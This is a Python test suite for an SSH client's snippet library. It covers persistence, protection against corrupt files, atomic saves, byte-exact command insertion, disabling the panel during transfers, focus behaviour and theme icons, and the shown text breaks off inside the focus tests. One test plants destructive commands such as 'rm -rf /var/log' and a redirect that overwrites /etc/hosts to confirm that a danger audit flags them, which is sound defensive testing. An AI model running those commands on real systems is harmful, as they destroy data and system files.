"""片段库的数据层：存取、脏数据、以及两个不能省的写盘规矩。

**这一组全平台都跑**，不碰真二进制，也不需要 SSH。

三件事是踩过才知道要单独测的：

1. **「读完之后不许顺手写」。** `AppSettings` 曾经因为 UTF-8 BOM 触发
   `json.JSONDecodeError`，`load_from` 里的裸 `except` 把它吞成全默认值，
   `main.py` 紧接着的一句 `settings.save()` 就把用户自己存的会话**永久清空**
   了。所以这里直接断言**文件内容没被改**——光断言"内存里有默认值"是抓不到
   这个的，因为写盘之前内存里也确实是默认值。

2. **写盘失败必须可注入。** 原来用 `os.chmod(dir, 0o500)` 造"不可写目录"，
   在 Windows 上根本挡不住写入，于是"保存失败会返回 False"这条永远测不到，
   是一条假测试。跨平台可靠的强制失败是**把父路径做成一个普通文件**：
   `mkdir` 抛 `FileExistsError`、`write_text` 抛 `FileNotFoundError`
   （注意**不是** `NotADirectoryError`——本机 Python 3.14 实测三个构造全是
   `FileExistsError`，写成 `pytest.raises(NotADirectoryError)` 会在 Windows
   上假失败）。

3. **危险命令自检不能恒真。** `audit_builtins` 返回空列表是常态，
   所以必须往内置表里塞一条 `rm -rf` 回去，证明它真的会报——否则一个
   「什么都不检查」的函数和这个检查长得一模一样。

Checks:
  1. 默认集非空、id 稳定、不重复
  2. 危险命令自检能证伪（塞回 rm -rf / 重定向 / 坏引号都要被抓到）
  3. 增删改 + 落盘往返，id 跨实例稳定
  4. restore_builtins 只补内置，不动用户自己的
  5. 读坏了不许覆盖用户文件；BOM、脏条目、全坏、顶层不是数组
  6. 写盘失败能注入（父路径是普通文件），且内存里的东西不丢
  7. 原子写：.tmp + replace，不留残骸
  8. 搜索
  9. 两个 store 的写入语义是「最后写入者赢」
 10. **插入只发命令本身，一个字节都不多（多一个 \\r 就是替用户执行了）**
 11. 传输期间整块禁用；busyChanged 只在真翻转时发
 12. 面板不抢焦点；回车/Esc/上下键不漏给远端
 13. 片段库是 app 级单例，不是每个标签一份
 14. 面板的增删改、搜索、以及「过滤后必须仍有选中项」
 15. 工具栏按钮与 snippet 图标（**换主题后比对渲染出的位图**，不是读属性）
 16. 非 UTF-8 的文件不能让应用起不来（曾经是真崩溃：UnicodeDecodeError
     是 ValueError 不是 OSError，穿透 __init__ 冒到 MainWindow）
 17. 坏文件要改名隔离，不能等下一次 save 覆盖
 18. 命令里的换行必须**在入库时**拒收（逐字节发出 = 替用户按回车）
 19. 危险命令自检的覆盖面（第一版 16 种里漏了 12 种）
 20. 内置 id 由内容派生；重复 id 会合并（否则 remove 一次删两条）
 21. 并发写不会发布损坏的文件（真·独立进程，原子写只对崩溃成立）
 22. 闸门起点：远端已发出、本地还没起的那半秒也必须禁插
 23. 片段库是整个进程一份，不是一个窗口一份
 24. 保存失败必须让用户看见（Windows 并发写时 os.replace 会成片报 WinError 5）
 25. 危险命令自检第二版：剥前缀链 / 点号变体 / 嵌套载荷 + 负向对照
 26. 片段能改：编辑 → 保存，id 不变、条数不变、插入的仍是新命令本身
"""
import json
import os
import pathlib
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from PyQt6 import QtCore, QtTest, QtWidgets

from sshclient.core import snippets
from sshclient.core.snippets import (
    Snippet,
    SnippetStore,
    audit_builtins,
    default_snippets,
)

PASS, FAIL = [], []


def check(name, ok, detail=""):
    (PASS if ok else FAIL).append(name if ok else "%s  <- %s" % (name, detail))
    print(("  [ok] " if ok else "  [FAIL] ") + name +
          ("" if ok else "   <- %s" % detail))


def settle(app, ms=200):
    """真转一会儿事件循环。

    **不转就是假的。** 焦点、show()、布局都要走一轮事件循环才落定，
    实测 `QTest.qWait(150)` 之前 `focusWidget()` 还是 None。
    """
    end = [False]
    QtCore.QTimer.singleShot(ms, lambda: end.__setitem__(0, True))
    while not end[0]:
        app.processEvents()


def tmpdir() -> pathlib.Path:
    return pathlib.Path(tempfile.mkdtemp(prefix="snip_"))


def _focus_key(app, key, where, expect=None):
    """把一个键发给**当前焦点所在的控件**；焦点没落上去时安全地跳过。

    **不能直接把 ``app.focusWidget()`` 塞给 ``QTest.keyClick``。** 焦点不在
    任何控件上时它是 ``None``，而 ``keyClick(None, …)`` 触发的是 Qt 自己的
    assert（``qtestkeyboard.h:194`` 那个 ``"widget"``）—— 整个进程
    ``0xC0000409`` 死掉，**连一行 traceback 都没有**。

    ``expect`` 是"这一下本来应该发给谁"。给了它就在**发键前再复检一次**：
    实测焦点会在 ``setCurrentRow`` / ``activateWindow`` 之后漂走，于是
    前面刚查过"焦点在搜索框上"、真发键时已经不在了，键就发给了别处 ——
    表现为"按回车没插入"，而代码没坏。

    这一组原本两头都栽：直接传 ``focusWidget()`` 会崩，不传就误报。
    """
    w = app.focusWidget()
    if expect is not None and w is not expect:
        SKIPPED.append(where)
        print("       （发键那一刻焦点漂了，跳过：%s）" % where)
        return False
    if w is None:
        check("%s：焦点压根没落在任何控件上，这一下没发出去" % where, False,
              "focusWidget() is None")
        SKIPPED.append(where)
        return False
    QtTest.QTest.keyClick(w, key)
    return True


def _focus_is(app, widget, where) -> bool:
    """焦点必须落在 ``widget`` 上。判据返回 False 时**调用方要负责收尾退出**，
    因为后面每一次 keyClick 都建立在这个前提上。"""
    fw = app.focusWidget()
    ok = fw is widget
    check(where, ok, repr(fw))
    return ok


#: 因为前提没成立而**跳过的判据**。单独记一份，结尾要打印出来 ——
#: "跳过"和"通过"在输出里长得几乎一样，不点出来迟早被当成"测过了"。
SKIPPED: list[str] = []


def _require_focus(app, widget, where) -> bool:
    """把焦点按到 ``widget`` 上，并确认它**真的**落上去了。

    **返回 False 时调用方必须跳过那一段。** 焦点组量的每一件事都建立在
    "焦点此刻在某个控件上"这个前提上；前提没成立还往下断言，报出来的红是
    **环境造成的**，不是被测代码坏了。而一个每三四轮就误报一次的测试，
    迟早被人当成"偶发，不看"——那还不如明说没测。

    ``setFocus()`` 是个**请求**不是命令：``Qt.Tool`` 窗口在 Windows 上没真正
    激活时它经常不生效。拿未改动的 HEAD 跑 15 轮就有 4 轮红。
    """
    widget.setFocus()
    settle(app, 150)
    if app.focusWidget() is widget:
        return True
    SKIPPED.append(where)
    print("       （焦点没抢到，跳过：%s）" % where)
    return False


def _summary() -> int:
    """打印汇总并给出**退出码**。

    **有跳过就不能报 0。** 评审实测过一个具体的洞：只坏焦点和
    「焦点坏 + Esc 逻辑也真坏」两种情况，输出**完全一样**
    （``绿=1 红=0 跳过=3``），而原来的退出码只看 ``FAIL`` —— 于是
    **真的 Esc 回归被静默跳过，整套测试还报成功**。退出码 2 是
    「一条都没红，但有没评上的」，必须和「全绿」区分开。
    """
    print("\n通过 %d 项，失败 %d 项" % (len(PASS), len(FAIL)))
    for f in FAIL:
        print("  FAIL " + f)
    # **跳过必须和通过长得不一样。** 「跳过」不打出来的话，输出里少了几条
    # 绿字看着像"测过了"，而实际上那几件事这一次根本没评。
    if SKIPPED:
        print("另有 %d 处**跳过**（不是通过）：前提没成立，判据没评上"
              % len(SKIPPED))
        for s in SKIPPED:
            print("  跳过 " + s)
        if not FAIL:
            return 2
    return 1 if FAIL else 0


def group_13_15(app):
    """13~15 组（片段库是 app 级单例、面板的增删改与过滤、工具栏按钮）。

    原来是内联在 main() 里的。抽出来是为了让第 12 组在 offscreen 下
    早退时也能把后面这几组跑完 —— 见 main() 里那段注释。

    **局部 import 要跟着搬过来**：原来是 main() 里 import 的，
    搬进模块级函数后那个名字不在作用域里了（会 NameError）。
    """
    from sshclient.ui.snippet_panel import SnippetPanel
    # ------------------------------------------------------------ 13
    print("\n[13] 片段库是 app 级单例，不是每个标签一份")
    from sshclient.core import settings as _settings
    from sshclient.ui import main_window as _mw

    bare = _mw.SessionTab()
    check("无 parent 的 SessionTab 拿不到片段库（不是自己造一份）",
          bare.snippet_store is None, repr(bare.snippet_store))
    st13 = _settings.AppSettings()
    st13.save = lambda: None
    # **必须注入临时 store。** 缺省那个指向真实的 %APPDATA%\MavisSSH\
    # snippets.json，测试对它 .add() 就是每跑一次往用户自己的配置里塞一条
    # 垃圾——踩过，用户的文件里一度积了 15 条同名测试片段。
    injected13 = SnippetStore(tmpdir() / "snippets.json")
    win13 = _mw.MainWindow(st13, _settings.SessionStore(
        pathlib.Path(tempfile.mkdtemp()) / "s.json"),
        snippet_store=injected13)
    check("注入的那份被用上了（不是又建了一个默认的）",
          win13.snippet_store is injected13, repr(win13.snippet_store))
    check("MainWindow 上有一份片段库", win13.snippet_store is not None)
    t1 = _mw.SessionTab(win13)
    t2 = _mw.SessionTab(win13)
    check("两个标签页拿到的是同一份",
          t1.snippet_store is t2.snippet_store is win13.snippet_store)
    check("id 也确实相同（不是两个等价的副本）",
          id(t1.snippet_store) == id(t2.snippet_store))
    win13.snippet_store.add("A 标签加的", "echo a")
    check("一个标签加的，另一个立刻看得到",
          any(s.title == "A 标签加的" for s in t2.snippet_store.items))
    check("另一个标签插入时用的是同一个 store",
          t2.snippet_store is t1.snippet_store)
    win13.deleteLater()
    QtCore.QCoreApplication.sendPostedEvents(
        None, QtCore.QEvent.Type.DeferredDelete)

    # ------------------------------------------------------------ 14
    print("\n[14] 面板的增删改和搜索")
    store14 = SnippetStore(tmpdir() / "s.json")
    sent14 = []

    def rec14(data: bytes) -> bool:
        sent14.append(data)
        return True

    pan14 = SnippetPanel(store14, rec14)
    pan14.show()
    app.processEvents()
    n0 = pan14.list.count()
    check("列表一开始就有内容", n0 == len(store14.items), str(n0))
    pan14.title_edit.setText("看内核版本")
    pan14.cmd_edit.setText("uname -r")
    check("填全了之后「添加」才使能", pan14.add_btn.isEnabled())
    pan14._on_add()
    check("添加后列表多了一条", pan14.list.count() == n0 + 1)
    check("添加后输入框清空", pan14.title_edit.text() == "")
    check("添加后新条目被选中", pan14.current().title == "看内核版本")
    pan14.filter_edit.setText("uname")
    check("按命令搜得到", pan14.list.count() == 1, str(pan14.list.count()))
    pan14.filter_edit.setText("内核")
    check("按中文标题也搜得到", pan14.list.count() == 1, str(pan14.list.count()))
    check("搜索时预览区显示完整命令",
          pan14.preview.text() == "uname -r", pan14.preview.text())
    pan14.filter_edit.setText("不存在的")
    check("搜不到时列表是空的", pan14.list.count() == 0)
    check("搜不到时提示一句话", "没有匹配" in pan14.preview.text())
    check("搜不到时插入按钮禁用了（不是让用户点一个空的）",
          not pan14.insert_btn.isEnabled())

    # 过滤到不含原来那条的结果时，必须退到第一条。踩过：代码写成
    # `if keep: select(keep)` —— keep 非空就走进去，select 找不到、静默返回
    # False，于是"退到第一条"那行永远不跑，列表里明明有东西却一个都没选中，
    # 用户按回车毫无反应。
    pan14.filter_edit.setText("df")
    app.processEvents()
    check("过滤到不含原选中项的结果时，退到第一条（不是什么都不选）",
          pan14.current() is not None
          and pan14.list.currentRow() == 0,
          "currentRow=%s current=%r" % (pan14.list.currentRow(), pan14.current()))
    check("退到的那一条确实还能插入（回车有反应）",
          (pan14._on_insert(), sent14 and sent14[-1] == b"df -h")[-1],
          str(sent14[-1:]))
    pan14.filter_edit.clear()
    app.processEvents()
    check("清空过滤后仍然有选中项", pan14.current() is not None)

    # 删掉一条内置的，再恢复
    builtin_id = next(s.id for s in store14.items if s.builtin)
    pan14.select(builtin_id)
    pan14._on_delete()
    check("内置的也能删（用户就是嫌它占地方）",
          store14.get(builtin_id) is None)
    pan14._on_restore()
    check("「恢复内置」把它补回来了", store14.get(builtin_id) is not None)
    check("恢复不会把用户自己加的弄丢",
          any(s.title == "看内核版本" for s in store14.items))
    check("恢复之后落盘了，重新读还在",
          SnippetStore(store14.path).get(builtin_id) is not None)

    # 发送失败时要有提示，而不是静默无反应
    sent14.clear()

    def dead_send(_data: bytes) -> bool:
        return False

    pan15 = SnippetPanel(store14, dead_send)
    pan15.show()
    app.processEvents()
    pan15.list.setCurrentRow(0)
    pan15._on_insert()
    check("送不出去时给了一句提示（不是点了没反应）",
          "没插进去" in pan15.hint.text(), pan15.hint.text())
    pan15.close()
    pan14.close()

    # ------------------------------------------------------------ 15
    print("\n[15] 工具栏按钮和图标")
    from sshclient.ui import icons as I

    check("snippet 图标已注册", "snippet" in I.ICONS)
    for other in ("list", "chevron-right", "terminal"):
        a = I.icon_pixmap("snippet", "#ffffff", 18).toImage()
        b = I.icon_pixmap(other, "#ffffff", 18).toImage()
        d = sum(1 for y in range(18) for x in range(18)
                if a.pixel(x, y) != b.pixel(x, y))
        check("snippet 和 %s 画出来确实不同" % other, d > 30, "只差 %d 像素" % d)
    check("工具栏上有片段按钮", hasattr(_mw.SessionTab(), "snippet_btn"))
    tb = _mw.SessionTab()
    check("片段按钮在换主题的名单里（Ctrl+T 之后不会退回旧图标）",
          tb.snippet_btn in tb._toolbar_icon_buttons)
    check("按钮的图标名是 snippet", tb.snippet_btn._icon_name == "snippet",
          str(getattr(tb.snippet_btn, "_icon_name", "?")))

    # 换主题之后**实际画出来的位图**对不对。上一版只查了 `_icon_name`，
    # 而评审实测：把 apply_palette 改成给所有工具栏按钮画 `list`，124 项
    # 照样全绿 —— 判据量的是"按钮说自己叫什么"，不是"用户看到什么"。
    # 这一组必须落在渲染结果上。
    from sshclient.ui.design.v1.palette import get_palette

    for theme in ("dark", "light"):
        pal15 = get_palette(theme)
        w15 = _mw.MainWindow(st13, _settings.SessionStore(
            pathlib.Path(tempfile.mkdtemp()) / "s.json"),
            snippet_store=SnippetStore(tmpdir() / "s.json"))
        btn = _mw.SessionTab(w15)      # 工具栏在 SessionTab 上，不在窗口上
        btn.apply_palette(pal15)       # 模拟 Ctrl+T：窗口把新调色板刷下来
        px = btn.snippet_btn.iconSize().width()
        want = I.icon_pixmap("snippet", pal15.text, px).toImage()
        got = btn.snippet_btn.icon().pixmap(px).toImage()
        check("%s 主题下片段按钮画出来确实是 snippet" % theme,
              not got.isNull() and got == want,
              "像素不等（画的是别的东西）")
        if theme == "dark":
            # 负向对照：故意画成 list，上面那条判据必须变红。
            # 评审实测：把 apply_palette 改成给所有工具栏按钮画 list，
            # 改之前 124 项全绿 —— 判据量的是「按钮说自己叫什么」，
            # 不是「用户看到什么」。
            btn.snippet_btn.setIcon(I.icon("list", pal15, px))
            bad = btn.snippet_btn.icon().pixmap(px).toImage()
            check("负向对照：画成 list 之后判据必须判它不等",
                  bad != want, "换了图标居然判据说相等")
            btn.apply_palette(pal15)
        w15.deleteLater()
        btn.deleteLater()
        QtCore.QCoreApplication.sendPostedEvents(
            None, QtCore.QEvent.Type.DeferredDelete)


def main():
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication(sys.argv)

    # ------------------------------------------------------------ 1
    print("\n[1] 默认集")
    d = default_snippets()
    check("内置集不是空的", len(d) >= 8, "只有 %d 条" % len(d))
    check("内置集每条都有标题和命令",
          all(s.title and s.command for s in d))
    check("id 不重复（重复了 restore 就补不回来）",
          len({s.id for s in d}) == len(d),
          str(len({s.id for s in d})))
    check("两次 default_snippets() 结果一致（id 稳定）",
          [s.id for s in default_snippets()] == [s.id for s in d])
    check("没有两条讲同一件事的",
          len({s.title for s in d}) == len(d))
    check("默认集里没有危险命令", audit_builtins() == [], str(audit_builtins()))

    # ------------------------------------------------------------ 2
    print("\n[2] 危险命令自检必须能证伪")
    # 这一条是整组的关键：不装回缺陷版，下面所有「默认集干净」的断言都恒真。
    saved = snippets.BUILTIN_SNIPPETS
    try:
        snippets.BUILTIN_SNIPPETS = saved + (
            ("清理", "rm -rf /var/log", "危险"),)
        caught = audit_builtins()
        check("塞进一条 rm -rf 之后必须被抓到", len(caught) >= 1, str(caught))
        snippets.BUILTIN_SNIPPETS = saved + (
            ("导出", "docker ps > /etc/hosts", "危险"),)
        caught2 = audit_builtins()
        check("塞进一条带重定向的命令也必须被抓到", len(caught2) >= 1, str(caught2))
        snippets.BUILTIN_SNIPPETS = saved + (
            ("错引号", 'echo "未闭合', "危险"),)
        check("引号不配对也必须被抓到", len(audit_builtins()) >= 1)
    finally:
        snippets.BUILTIN_SNIPPETS = saved
    check("拿掉之后重新是干净的（证明上面不是误报）",
          audit_builtins() == [], str(audit_builtins()))

    # ------------------------------------------------------------ 3
    print("\n[3] 增删改 + 落盘往返")
    p = tmpdir() / "snippets.json"
    st = SnippetStore(p)
    check("新库第一次构造不写盘（没改过就不该写）", not p.exists())
    added = st.add("重启 nginx", "systemctl restart nginx")
    check("add 返回了那条", added is not None and added.title == "重启 nginx")
    check("add 之后落盘了", p.exists())
    again = SnippetStore(p)
    check("新实例读回来有用户片段",
          any(s.title == "重启 nginx" for s in again.items))
    check("读回来的命令一字不差",
          next(s.command for s in again.items if s.title == "重启 nginx")
          == "systemctl restart nginx")
    check("内置集也还在", any(s.builtin for s in again.items))
    check("id 跨实例稳定（改标题不会认成另一条）",
          next(s.id for s in again.items if s.title == "重启 nginx")
          == added.id)

    sid = added.id
    check("update 成功", again.update(sid, "重启 nginx (prod)",
                                      "systemctl restart nginx") is True)
    fresh = SnippetStore(p)
    check("改过之后重新读还是新标题",
          any(s.title == "重启 nginx (prod)" for s in fresh.items))
    check("改过之后 id 没变",
          any(s.id == sid and s.title == "重启 nginx (prod)"
              for s in fresh.items))
    check("remove 成功", fresh.remove(sid) is True)
    check("删掉之后再读确实没了",
          not any(s.id == sid for s in SnippetStore(p).items))
    check("删不存在的返回 False（不假装成功）", fresh.remove("nope") is False)
    check("update 不存在的返回 False", fresh.update("nope", "a", "b") is False)
    check("add 空标题被拒", st.add("", "x") is None)
    check("add 空命令被拒", st.add("x", "   ") is None)
    check("被拒的 add 没有落盘",
          not any(s.title == "" for s in SnippetStore(p).items))

    # ------------------------------------------------------------ 4
    print("\n[4] restore_builtins：只补内置，不动用户自己的")
    from sshclient.core.snippets import builtin_id

    t4, c4, _ = snippets.BUILTIN_SNIPPETS[0]
    first_two = [builtin_id(*x[:2]) for x in snippets.BUILTIN_SNIPPETS[:2]]
    st4 = SnippetStore(tmpdir() / "s.json")
    st4.add("我的私藏", "echo hi")
    n = st4.restore_builtins()
    check("全都齐全时一条都不用补", n == 0, "补了 %d 条" % n)
    st4.remove(first_two[0])
    st4.remove(first_two[1])
    n2 = st4.restore_builtins()
    check("删掉两条就补回两条", n2 == 2, "补了 %d 条" % n2)
    check("补回来的确实是那两条",
          all(st4.get(i) is not None for i in first_two),
          str([st4.get(i) for i in first_two]))
    check("用户自己加的没被冲掉",
          any(s.title == "我的私藏" for s in st4.items))
    check("补回来的是内置标记",
          sum(1 for s in st4.items if s.builtin) == len(default_snippets()),
          str(sum(1 for s in st4.items if s.builtin)))
    check("restore 之后落盘了", SnippetStore(st4.path).loaded_ok)

    # ------------------------------------------------------------ 5
    print("\n[5] 读坏了不许把用户数据覆盖掉（这里真出过事故）")
    p5 = tmpdir() / "s.json"
    p5.write_text("这不是 JSON", encoding="utf-8")
    before = p5.read_text(encoding="utf-8")
    st5 = SnippetStore(p5)
    check("坏文件退回内置集", len(st5.items) == len(default_snippets()))
    check("坏文件时 loaded_ok 为 False（界面上要提示）",
          st5.loaded_ok is False)
    # 现在的行为是**改名隔离**（见 [17]）：原字节还在，位置变了。
    kept = sorted(p5.parent.glob("s.json.bad-*"))
    check("**坏文件的原字节被保留下来了**",
          len(kept) == 1 and kept[0].read_text(encoding="utf-8") == before,
          str([k.name for k in kept]))
    check("原路径已经不占着（新文件可以从内置集干净重建）", not p5.exists())
    check("也没有留下 .tmp 残骸", not p5.with_name("s.json.tmp").exists())

    # BOM：PowerShell 5.1 的 Set-Content -Encoding UTF8 会写 BOM
    p5b = tmpdir() / "s.json"
    p5b.write_bytes(b"\xef\xbb\xbf" + json.dumps(
        [{"id": "u1", "title": "中文标题", "command": "echo 中文", "builtin": False}],
        ensure_ascii=False).encode("utf-8"))
    st5b = SnippetStore(p5b)
    check("带 BOM 的文件照样读得出来（不是 NotImplementedError）",
          st5b.loaded_ok is True)
    check("BOM 里的中文没丢",
          any(s.title == "中文标题" and s.command == "echo 中文"
              for s in st5b.items),
          str([(s.title, s.command) for s in st5b.items][:3]))

    # 单条脏数据：跳过那一条，其余照常
    p5c = tmpdir() / "s.json"
    p5c.write_text(json.dumps([
        {"id": "ok", "title": "好的", "command": "echo ok"},
        {"id": "bad1", "title": "缺命令"},
        {"id": "bad2", "command": "没有标题"},
        {"id": "bad3", "title": "空命令", "command": "   "},
        "根本不是对象",
    ], ensure_ascii=False), encoding="utf-8")
    st5c = SnippetStore(p5c)
    check("脏条目被跳过，好的留下",
          any(s.id == "ok" for s in st5c.items))
    check("脏条目没有被原样带进来",
          all(isinstance(s, Snippet) and s.title and s.command
              for s in st5c.items))
    check("有脏条目时 loaded_ok 为 False", st5c.loaded_ok is False,
          str(st5c.loaded_ok))
    p5d = tmpdir() / "s.json"
    p5d.write_text(json.dumps([{"id": "x", "title": "只有一条",
                                "command": "x"}], ensure_ascii=False),
                   encoding="utf-8")
    st5d = SnippetStore(p5d)
    check("正常文件 loaded_ok 为 True（防上一条恒真）",
          st5d.loaded_ok is True, str(st5d.loaded_ok))

    # 全军覆没：比"空列表"更可疑，得让用户知道自己写的东西没加载上来
    p5f = tmpdir() / "s.json"
    p5f.write_text(json.dumps([{"id": "b1", "title": "缺命令"},
                               {"id": "b2", "title": "  ", "command": "x"},
                               12345]), encoding="utf-8")
    st5f = SnippetStore(p5f)
    check("全部条目都是坏的时候退回内置集",
          [s.id for s in st5f.items] == [s.id for s in default_snippets()],
          str([s.id for s in st5f.items][:4]))
    check("全军覆没时 loaded_ok 为 False",
          st5f.loaded_ok is False, str(st5f.loaded_ok))
    check("**全坏的文件也没有被覆盖**",
          p5f.read_text(encoding="utf-8").count("b1") == 1,
          p5f.read_text(encoding="utf-8"))

    p5e = tmpdir() / "s.json"
    p5e.write_text(json.dumps({"不是": "数组"}), encoding="utf-8")
    check("顶层不是数组也退回内置集",
          SnippetStore(p5e).loaded_ok is False)

    # ------------------------------------------------------------ 6
    print("\n[6] 写盘失败必须能注入（chmod 在 Windows 上挡不住写入）")
    # 父路径是一个普通文件：mkdir 抛 FileExistsError、write_text 抛
    # FileNotFoundError。**不是 NotADirectoryError**（见模块 docstring）。
    blocker = tmpdir() / "i-am-a-file"
    blocker.write_text("x", encoding="utf-8")
    st6 = SnippetStore(blocker / "sub" / "s.json")
    check("目录建不出来时 save 返回 False 而不是抛", st6.save() is False)
    check("内存里的东西还在（保存失败不该丢数据）",
          len(st6.items) == len(default_snippets()))
    check("add 在写不出去时也不抛（返回片段，界面上照样能用）",
          st6.add("x", "echo x") is not None)

    # 负向对照：证明上面那个"返回 False"不是因为写盘根本没走到
    st6b = SnippetStore(tmpdir() / "ok.json")
    check("对照组：路径正常时 save 返回 True", st6b.save() is True)
    check("对照组：确实落了盘", st6b.path.exists())

    # ------------------------------------------------------------ 7
    print("\n[7] 原子写：先 .tmp 再 replace")
    p7 = tmpdir() / "s.json"
    st7 = SnippetStore(p7)
    st7.add("一条", "echo 1")
    check("写完之后没有 .tmp 残骸", not p7.with_name("s.json.tmp").exists())
    raw = p7.read_text(encoding="utf-8")
    check("文件是 JSON 数组", isinstance(json.loads(raw), list))
    check("中文按原样存（不是 \\uXXXX）", "重启" in raw or "一条" in raw,
          raw[:80])

    # ------------------------------------------------------------ 8
    print("\n[8] 搜索")
    st8 = SnippetStore(tmpdir() / "s.json")
    st8.add("重启 nginx", "systemctl restart nginx")
    st8.add("磁盘", "df -h")
    check("空查询返回全部", len(st8.search("")) == len(st8.items))
    check("按标题能搜到", [s.title for s in st8.search("nginx")] == ["重启 nginx"])
    check("按命令能搜到（大小写不敏感）",
          len(st8.search("SYSTEMCTL")) == 1)
    check("搜不到就是空列表", st8.search("不存在的命令") == [])
    check("搜到多条", len(st8.search("df")) >= 1)

    # ------------------------------------------------------------ 9
    print("\n[9] 并发写不互相覆盖（同一进程内两条 store）")
    p9 = tmpdir() / "s.json"
    a, b = SnippetStore(p9), SnippetStore(p9)
    a.add("A 加的", "echo a")
    b.add("B 加的", "echo b")
    # 后写的那份会覆盖前一份 —— 这是"最后写入者赢"，不是合并。
    # 明确记下来：片段库是单机单窗口场景，不做跨进程合并。
    final = {s.title for s in SnippetStore(p9).items}
    check("最后写入的那份完整落盘（语义明确，不是随机丢）",
          "B 加的" in final, str(sorted(final)))
    check("另一个 store 内存里还看得到自己那条",
          any(s.title == "A 加的" for s in a.items))

    # ------------------------------------------------------------ 10
    print("\n[10] 插入只发命令本身，一个字节都不多")
    # 这一组是整个功能的核心承诺，**必须在字节层面钉死**：
    # 发出去的东西必须恰好等于那条命令，多一个 `\r` 就等于替用户执行了。

    from sshclient.ui.snippet_panel import SnippetPanel
    from sshclient.ui.terminal_widget import TerminalWidget
    sent = []

    def rec(data: bytes) -> bool:
        sent.append(data)
        return True

    store10 = SnippetStore(tmpdir() / "s.json")
    pan = SnippetPanel(store10, rec)
    pan.show()
    app.processEvents()

    sent.clear()
    pan.list.setCurrentRow(0)
    pan._on_insert()
    first = store10.items[0].command
    check("发出去的就是那条命令，一个字节不差",
          sent == [first.encode("utf-8")], "sent=%r 期望=%r" % (sent, first.encode()))
    check("**没有偷偷补回车**（多一个 \\r 就是替用户执行了）",
          all(b"\r" not in s and b"\n" not in s for s in sent), str(sent))
    check("也没补 Tab / Ctrl 之类", all(s == first.encode("utf-8") for s in sent))

    sent.clear()
    store10.add("中文标题", "echo 你好")
    pan.reload()
    pan.filter_edit.setText("中文标题")
    pan._on_insert()
    check("中文片段按 UTF-8 送出去", sent == ["echo 你好".encode()], str(sent))

    # 命令里带换行的情况见 [18]：以前这里断言「如实发出（不吞不改）」，
    # 而逐字节原样发出去正好等于替用户按了回车 —— 那个断言钉错了方向。

    # 没选中任何东西时不许发空
    sent.clear()
    pan.filter_edit.setText("搜不到的东西")
    app.processEvents()
    pan._on_insert()
    check("没有选中时不发任何东西（不是发空串）", sent == [], str(sent))
    pan.filter_edit.clear()
    pan.close()

    # ------------------------------------------------------------ 11
    print("\n[11] 传输期间整块禁用")
    from sshclient.ui.design.v1.palette import get_palette
    from sshclient.ui.transfer_controller import TransferController

    ctrl11 = TransferController(get_palette("dark"), None)
    store11 = SnippetStore(tmpdir() / "s.json")
    sent11 = []

    def rec11(data: bytes) -> bool:
        sent11.append(data)
        return True

    pan11 = SnippetPanel(store11, rec11, ctrl=ctrl11)
    pan11.show()
    app.processEvents()
    pan11.list.setCurrentRow(0)
    check("空闲时插入按钮是使能的（不是天生就禁着的假通过）",
          pan11.insert_btn.isEnabled())
    pan11._sync_enabled()

    class _Eng:
        def start(self): pass

        def request_cancel(self): pass

    events = []
    ctrl11.busyChanged.connect(lambda b: events.append(b))
    check("begin 被接受", ctrl11.begin("upload", "上传", _Eng(), 1) is True)
    check("begin 之后按钮禁用了（通道被占着）",
          not pan11.insert_btn.isEnabled())
    check("begin 之后列表也禁用了", not pan11.list.isEnabled())
    sent11.clear()
    pan11._on_insert()
    check("忙时双击列表也插不进去（按钮那条路之外还要再挡一道）",
          sent11 == [], str(sent11))
    ctrl11.succeed("")
    check("传输结束之后恢复使能", pan11.insert_btn.isEnabled())
    check("忙时信号序列恰好是 [True, False]",
          events == [True, False], str(events))

    # 被闸门拒掉的 begin 不该发信号；空闲时 reset 也不该发
    events.clear()
    ctrl11.begin("upload", "上传", _Eng(), 1)
    ctrl11.begin("download", "下载", _Eng(), 1)      # 被拒
    check("被闸门拒掉的 begin 不发 busyChanged",
          events == [True], str(events))
    ctrl11.succeed("")
    events.clear()
    ctrl11.reset("本来就空闲")
    check("本来就空闲时 reset 不发 busyChanged", events == [], str(events))
    ctrl11.begin("upload", "上传", _Eng(), 1)
    events.clear()
    ctrl11.reset("断线")
    check("真在忙时 reset 发一次 False", events == [False], str(events))
    check("reset 之后不再 busy（不释放就再也传不了）", ctrl11.busy is False)
    pan11.close()

    # ------------------------------------------------------------ 12
    print("\n[12] 面板不抢焦点，按键也不漏到远端")
    # 评审实测过：QTest.keyClick(widget, ...) 是直接塞事件，绕开焦点系统，
    # 拿它测「焦点还在不在」是无效的。这里一律投给
    # QApplication.focusWidget()——那才是真实按键走的路。
    store12 = SnippetStore(tmpdir() / "s.json")
    sent12 = []

    def rec12(data: bytes) -> bool:
        sent12.append(data)
        return True

    pan12 = SnippetPanel(store12, rec12)
    term = TerminalWidget()

    class _Ch:
        closed = False

        def __init__(self):
            self.sent = []

        def sendall(self, data):
            self.sent.append(data)

    ch12 = _Ch()
    term.bind_channel(ch12, manage_notifier=False)
    host = QtWidgets.QWidget()
    hl = QtWidgets.QVBoxLayout(host)
    hl.addWidget(term)
    host.resize(600, 400)
    host.show()
    term.setFocus()
    settle(app, 200)


    def _focus_checks():
        """焦点相关的判据。**抽成函数是为了不再 return 出 main()** ——
        以前这段里有两处 `return`，命中任何一处都会让第 13~30 组、
        汇总和退出码全都不跑，而退出码还是 0。
        """
        check("先确认焦点确实在终端上（下面才有意义）",
              app.focusWidget() is term, repr(app.focusWidget()))

        pan12.show()
        settle(app, 200)
        check("**面板 show() 之后焦点仍在终端**（用户正在敲的字不能被夺走）",
              app.focusWidget() is term, repr(app.focusWidget()))
        check("面板确实可见（不是 show 失败了所以焦点没动）", pan12.isVisible())

        # 焦点在终端时，Enter 还是发给远端
        if not _require_focus(app, term, "焦点在终端时按回车"):
            pass
        else:
            ch12.sent.clear()
            _focus_key(app, QtCore.Qt.Key.Key_Return, "焦点在终端时按回车")
            settle(app, 80)
            check("焦点在终端时回车照常发给远端（面板没把它吃掉）",
                  ch12.sent == [b"\r"], str(ch12.sent))

        # **模拟用户点进面板。** WA_ShowWithoutActivating 只影响 show() 那一下，
        # 真实使用中用户点搜索框会让 Windows 激活这个 Tool 窗口；程序里
        # setFocus() 对未激活的窗口是无效的，所以这里先 activateWindow()。
        pan12.activateWindow()
        pan12.raise_()
        settle(app, 200)
